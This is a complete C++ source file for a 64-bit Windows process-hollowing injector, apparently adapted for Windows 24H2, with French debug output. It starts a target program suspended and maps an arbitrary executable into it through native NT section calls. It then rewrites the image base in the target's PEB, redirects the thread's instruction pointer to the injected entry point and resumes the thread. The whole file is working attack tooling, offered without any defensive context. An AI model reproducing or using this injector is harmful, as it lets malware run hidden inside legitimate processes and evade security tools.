#include <Windows.h>
#include <cstdio>
#include <winternl.h>
#include <cstring>

typedef enum _SECTION_INHERIT {
    ViewShare = 1,
    ViewUnmap = 2
} SECTION_INHERIT;

typedef NTSTATUS(NTAPI* pfnNtCreateSection)(
    PHANDLE SectionHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PLARGE_INTEGER MaximumSize,
    ULONG SectionPageProtection,
    ULONG AllocationAttributes,
    HANDLE FileHandle
    );

typedef NTSTATUS(NTAPI* pfnNtMapViewOfSection)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    SECTION_INHERIT InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect
    );

typedef NTSTATUS(NTAPI* pfnNtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID BaseAddress
    );

pfnNtCreateSection NtCreateSection = nullptr;
pfnNtMapViewOfSection NtMapViewOfSection = nullptr;
pfnNtUnmapViewOfSection NtUnmapViewOfSection = nullptr;

struct ProcessAddressInformation
{
    LPVOID lpProcessPEBAddress;
    LPVOID lpProcessImageBaseAddress;
};

HANDLE OpenPEFile(const LPSTR lpFilePath)
{
    printf("[DEBUG] Tentative d'ouverture du fichier: %s\n", lpFilePath);
    HANDLE hFile = CreateFileA(lpFilePath, GENERIC_READ | GENERIC_EXECUTE, FILE_SHARE_READ, nullptr,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("[-] Erreur lors de l'ouverture du fichier PE. Code d'erreur: %lu\n", GetLastError());
        return nullptr;
    }
    printf("[DEBUG] Fichier ouvert avec succès. Handle: 0x%p\n", hFile);
    return hFile;
}

LPVOID MapPEFile(HANDLE hFile)
{
    printf("[DEBUG] Création du mapping du fichier PE...\n");
    HANDLE hMapping = CreateFileMappingA(hFile, nullptr, PAGE_READONLY, 0, 0, nullptr);
    if (!hMapping)
    {
        printf("[-] Erreur lors de la création du mapping du fichier PE. Code d'erreur: %lu\n", GetLastError());
        return nullptr;
    }
    LPVOID lpFileContent = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!lpFileContent)
    {
        printf("[-] Erreur lors du mapping en mémoire du fichier PE. Code d'erreur: %lu\n", GetLastError());
        CloseHandle(hMapping);
        return nullptr;
    }
    printf("[DEBUG] Fichier mappé en mémoire à l'adresse: 0x%p\n", lpFileContent);
    CloseHandle(hMapping);
    return lpFileContent;
}

BOOL IsValidPE(const LPVOID lpImage)
{
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpImage;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
    {
        printf("[-] Signature DOS invalide: 0x%X\n", pDosHeader->e_magic);
        return FALSE;
    }
    PIMAGE_NT_HEADERS64 pNtHeader = (PIMAGE_NT_HEADERS64)((uintptr_t)lpImage + pDosHeader->e_lfanew);
    if (pNtHeader->Signature != IMAGE_NT_SIGNATURE)
    {
        printf("[-] Signature NT invalide: 0x%X\n", pNtHeader->Signature);
        return FALSE;
    }
    return TRUE;
}

ProcessAddressInformation GetProcessAddressInformation64(const PPROCESS_INFORMATION lpPI)
{
    ProcessAddressInformation procInfo = { nullptr, nullptr };
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(lpPI->hThread, &ctx))
    {
        printf("[-] GetThreadContext a échoué. Code d'erreur: %lu\n", GetLastError());
        return procInfo;
    }
    printf("[DEBUG] Contexte récupéré. Rdx = 0x%p\n", (LPVOID)ctx.Rdx);

    BOOL bRead = ReadProcessMemory(lpPI->hProcess, (LPVOID)((uintptr_t)ctx.Rdx + 0x10), &procInfo.lpProcessImageBaseAddress, sizeof(UINT64), nullptr);
    if (!bRead)
    {
        printf("[-] ReadProcessMemory a échoué lors de la lecture de la base d'image. Code d'erreur: %lu\n", GetLastError());
        return procInfo;
    }
    procInfo.lpProcessPEBAddress = (LPVOID)ctx.Rdx;
    printf("[DEBUG] PEB récupéré à l'adresse: 0x%p, Base d'image: 0x%p\n", procInfo.lpProcessPEBAddress, procInfo.lpProcessImageBaseAddress);
    return procInfo;
}

BOOL RunPE64Section(const LPPROCESS_INFORMATION lpPI, const LPSTR lpPEPath, LPVOID lpFileContent)
{
    printf("[DEBUG] Début de RunPE64Section...\n");

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)lpFileContent;
    PIMAGE_NT_HEADERS64 pNtHeader = (PIMAGE_NT_HEADERS64)((PBYTE)lpFileContent + pDosHeader->e_lfanew);
    printf("[DEBUG] PE headers récupérés. SizeOfImage = 0x%Ix\n", pNtHeader->OptionalHeader.SizeOfImage);

    HANDLE hFile = OpenPEFile(lpPEPath);
    if (!hFile)
    {
        printf("[-] Échec de l'ouverture du fichier PE dans RunPE64Section.\n");
        return FALSE;
    }
    printf("[DEBUG] Fichier PE réouvert pour NtCreateSection. Handle: 0x%p\n", hFile);

    HANDLE hSection = nullptr;
    printf("[DEBUG] Appel de NtCreateSection avec les paramètres suivants:\n");
    printf("         DesiredAccess: 0x%X\n", SECTION_MAP_READ | SECTION_MAP_EXECUTE);
    printf("         SectionPageProtection: PAGE_EXECUTE_READ\n");
    printf("         AllocationAttributes: SEC_IMAGE\n");

    NTSTATUS status = NtCreateSection(
        &hSection,
        SECTION_MAP_READ | SECTION_MAP_EXECUTE,
        nullptr,
        nullptr,
        PAGE_EXECUTE_READ,
        SEC_IMAGE,
        hFile
    );

    printf("[DEBUG] NtCreateSection retourne: 0x%X\n", status);
    CloseHandle(hFile);
    if (!NT_SUCCESS(status))
    {
        printf("[-] NtCreateSection échoué : 0x%X\n", status);
        return FALSE;
    }
    else
    {
        printf("[DEBUG] Section créée avec succès. Handle de section: 0x%p\n", hSection);
    }

    PVOID lpLocalSectionBase = nullptr;
    SIZE_T viewSize = 0;
    printf("[DEBUG] Mappage local de la section...\n");
    status = NtMapViewOfSection(
        hSection,
        GetCurrentProcess(),
        &lpLocalSectionBase,
        0, 0,
        nullptr,
        &viewSize,
        ViewUnmap,
        0,
        PAGE_EXECUTE_READ
    );
    printf("[DEBUG] NtMapViewOfSection (local) retourne: 0x%X\n", status);
    if (!NT_SUCCESS(status))
    {
        printf("[-] NtMapViewOfSection (local) échoué : 0x%X\n", status);
        CloseHandle(hSection);
        return FALSE;
    }
    else
    {
        printf("[DEBUG] Section mappée localement à: 0x%p, viewSize: 0x%Ix\n", lpLocalSectionBase, viewSize);
    }

    PVOID lpRemoteSectionBase = nullptr;
    viewSize = 0;
    printf("[DEBUG] Mappage de la section dans le processus cible...\n");
    status = NtMapViewOfSection(
        hSection,
        lpPI->hProcess,
        &lpRemoteSectionBase,
        0, 0,
        nullptr,
        &viewSize,
        ViewUnmap,
        0,
        PAGE_EXECUTE_READ
    );
    printf("[DEBUG] NtMapViewOfSection (remote) retourne: 0x%X\n", status);

    if (!NT_SUCCESS(status))
    {
        printf("[-] NtMapViewOfSection (remote) échoué : 0x%X\n", status);
        NtUnmapViewOfSection(GetCurrentProcess(), lpLocalSectionBase);
        CloseHandle(hSection);
        return FALSE;
    }
    printf("[+] Section mappée dans le processus cible à : 0x%p\n", lpRemoteSectionBase);

    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_FULL;
    printf("[DEBUG] Récupération du contexte du thread cible...\n");
    if (!GetThreadContext(lpPI->hThread, &ctx))
    {
        printf("[-] GetThreadContext échoué. Code d'erreur: %lu\n", GetLastError());
        NtUnmapViewOfSection(lpPI->hProcess, lpRemoteSectionBase);
        NtUnmapViewOfSection(GetCurrentProcess(), lpLocalSectionBase);
        CloseHandle(hSection);
        return FALSE;
    }
    printf("[DEBUG] Contexte récupéré. Rdx = 0x%p\n", (LPVOID)ctx.Rdx);

    printf("[DEBUG] Mise à jour du PEB du processus cible (adresse: 0x%p)...\n", (PBYTE)ctx.Rdx + 0x10);
    if (!WriteProcessMemory(lpPI->hProcess, (PBYTE)ctx.Rdx + 0x10, &lpRemoteSectionBase, sizeof(DWORD64), nullptr))
    {
        printf("[-] WriteProcessMemory pour mettre à jour le PEB échoué. Code d'erreur: %lu\n", GetLastError());
        NtUnmapViewOfSection(lpPI->hProcess, lpRemoteSectionBase);
        NtUnmapViewOfSection(GetCurrentProcess(), lpLocalSectionBase);
        CloseHandle(hSection);
        return FALSE;
    }
    else
    {
        printf("[DEBUG] PEB mis à jour avec succès.\n");
    }

    ctx.Rip = (DWORD64)lpRemoteSectionBase + pNtHeader->OptionalHeader.AddressOfEntryPoint;
    printf("[DEBUG] Mise à jour du contexte: nouveau RIP = 0x%p\n", (PVOID)ctx.Rip);
    if (!SetThreadContext(lpPI->hThread, &ctx))
    {
        printf("[-] SetThreadContext échoué. Code d'erreur: %lu\n", GetLastError());
        NtUnmapViewOfSection(lpPI->hProcess, lpRemoteSectionBase);
        NtUnmapViewOfSection(GetCurrentProcess(), lpLocalSectionBase);
        CloseHandle(hSection);
        return FALSE;
    }
    else
    {
        printf("[DEBUG] Contexte mis à jour avec succès.\n");
    }

    printf("[DEBUG] Reprise du thread cible...\n");
    ResumeThread(lpPI->hThread);

    NtUnmapViewOfSection(GetCurrentProcess(), lpLocalSectionBase);
    CloseHandle(hSection);
    printf("[DEBUG] Injection terminée.\n");

    return TRUE;
}

int main(const int argc, char* argv[])
{
    printf("[DEBUG] Début de l'exécution du programme.\n");

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (hNtdll)
    {
        printf("[DEBUG] Module ntdll.dll chargé à l'adresse: 0x%p\n", hNtdll);
        NtCreateSection = (pfnNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
        NtMapViewOfSection = (pfnNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
        NtUnmapViewOfSection = (pfnNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    }
    if (!NtCreateSection || !NtMapViewOfSection || !NtUnmapViewOfSection)
    {
        printf("[-] Impossible de récupérer les fonctions NT nécessaires.\n");
        return -1;
    }
    printf("[DEBUG] Fonctions NT récupérées avec succès.\n");

    if (argc != 3)
    {
        printf("[HELP] process_hollowing_24h2.exe <pe_file> <target_process>\n");
        return -1;
    }

    LPSTR lpSourceImage = argv[1];
    LPSTR lpTargetProcess = argv[2];

    printf("[PROCESS HOLLOWING - 64 bits]\n");

    HANDLE hPEFile = OpenPEFile(lpSourceImage);
    if (!hPEFile)
        return -1;

    LPVOID lpFileContent = MapPEFile(hPEFile);
    if (!lpFileContent)
    {
        CloseHandle(hPEFile);
        return -1;
    }

    if (!IsValidPE(lpFileContent))
    {
        printf("[-] Le fichier PE n'est pas valide !\n");
        UnmapViewOfFile(lpFileContent);
        CloseHandle(hPEFile);
        return -1;
    }
    printf("[+] Le fichier PE est valide.\n");

    CloseHandle(hPEFile);

    STARTUPINFOA SI = {};
    PROCESS_INFORMATION PI = {};
    SI.cb = sizeof(SI);
    printf("[DEBUG] Création du processus cible : %s\n", lpTargetProcess);
    if (!CreateProcessA(lpTargetProcess, nullptr, nullptr, nullptr, TRUE, CREATE_SUSPENDED, nullptr, nullptr, &SI, &PI))
    {
        printf("[-] Erreur lors de la création du processus cible. Code d'erreur: %lu\n", GetLastError());
        UnmapViewOfFile(lpFileContent);
        return -1;
    }
    printf("[DEBUG] Processus cible créé. PID = %lu\n", PI.dwProcessId);

    ProcessAddressInformation procInfo = GetProcessAddressInformation64(&PI);
    if (!procInfo.lpProcessImageBaseAddress || !procInfo.lpProcessPEBAddress)
    {
        printf("[-] Erreur lors de la récupération des adresses du processus cible !\n");
        TerminateProcess(PI.hProcess, -1);
        CloseHandle(PI.hThread);
        CloseHandle(PI.hProcess);
        UnmapViewOfFile(lpFileContent);
        return -1;
    }
    printf("[+] PEB du processus cible : 0x%p\n", procInfo.lpProcessPEBAddress);
    printf("[+] Base de l'image dans le processus cible : 0x%p\n", procInfo.lpProcessImageBaseAddress);

    if (RunPE64Section(&PI, lpSourceImage, lpFileContent))
    {
        printf("[+] Injection réussie !\n");
        UnmapViewOfFile(lpFileContent);
        return 0;
    }
    else
    {
        printf("[-] L'injection a échoué !\n");
        TerminateProcess(PI.hProcess, -1);
        CloseHandle(PI.hThread);
        CloseHandle(PI.hProcess);
        UnmapViewOfFile(lpFileContent);
        return -1;
    }
}
